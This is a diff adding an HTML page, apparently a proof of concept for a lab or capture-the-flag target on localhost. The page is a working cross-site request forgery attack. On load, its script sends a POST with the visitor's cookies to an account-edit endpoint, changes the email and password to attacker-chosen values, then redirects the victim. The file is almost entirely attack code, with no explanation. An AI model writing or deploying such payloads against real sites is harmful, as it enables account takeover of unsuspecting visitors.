@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3xp10it3r@h4ck3r</title>
+</head>
+
+<body style="text-align: center; background-color: black; color: rgb(0, 255, 64);">
+    <img src="https://cdn-icons-png.flaticon.com/512/6071/6071905.png">
+    <script>
+        fetch("http://localhost:3000/api/edit", {
+            method: "POST",
+            credentials: "include",
+            mode: "no-cors",
+            headers: {
+                "content-type": "application/x-www-form-urlencoded"
+            },
+            body: "newFlag=3xp10it3r@h4ck3r.c0m&newPassword=3xp10it3r"
+        })
+            .then(() => {
+                setTimeout(() => {
+                    window.location.href = "http://localhost:3000"
+            }, 400)
+        })
+    </script>
+</body>
+
+</html>
